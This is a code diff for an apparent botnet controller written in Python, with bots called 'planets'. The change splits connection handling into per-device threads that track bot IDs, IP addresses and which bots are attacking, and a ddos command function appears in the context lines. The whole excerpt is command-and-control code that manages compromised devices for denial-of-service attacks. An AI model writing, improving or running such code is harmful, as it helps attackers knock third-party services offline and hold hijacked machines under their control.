@@ -64,7 +64,7 @@ def bind_port():
                 raise e
 
 
-def planet_handler():
+def connection_handler():
     """Handle connections of remote devices."""
     while galaxy_online:
         try:
@@ -74,6 +74,7 @@ def planet_handler():
             planet_id = token_hex(10)
             planet_ids.append(planet_id)
             planet.send(f"planet ID: {planet_id}".encode())
+            Thread(target=planet_handler, args=(planet, )).start()
         except TimeoutError:
             pass
         except OSError as e:
@@ -81,21 +82,27 @@ def planet_handler():
                 break
             else:
                 raise e
-        for handler_i, planet in enumerate(planets):
-            try:
-                data = planet.recv(1024).decode("ascii").lower().strip()
-                if not data:
-                    pass
-                elif "offline" in data:
-                    del planets[handler_i]
-                    del planet_ips[handler_i]
-                    del planet_ids[handler_i]
-                elif "stopping attack" in data:
-                    planets_attacking.remove(planet)
-            except BrokenPipeError:
-                del planets[handler_i]
-                del planet_ips[handler_i]
-                del planet_ids[handler_i]
+
+
+def planet_handler(planet):
+    """Handle remote devices."""
+    while galaxy_online:
+        try:
+            data = planet.recv(1024).decode("ascii").lower().strip()
+            if not data:
+                pass
+            elif "offline" in data:
+                planet_index = planets.index(planet)
+                del planets[planet_index]
+                del planet_ips[planet_index]
+                del planet_ids[planet_index]
+            elif "stopping attack" in data:
+                planets_attacking.remove(planet)
+        except BrokenPipeError:
+            planet_index = planets.index(planet)
+            del planets[planet_index]
+            del planet_ips[planet_index]
+            del planet_ids[planet_index]
 
 
 def ddos(cmd_ddos):
@@ -257,7 +264,7 @@ galaxy_online = False
 
 # bind to port
 bind_port()
-Thread(target=planet_handler).start()
+Thread(target=connection_handler).start()
 
 
 # main stuff
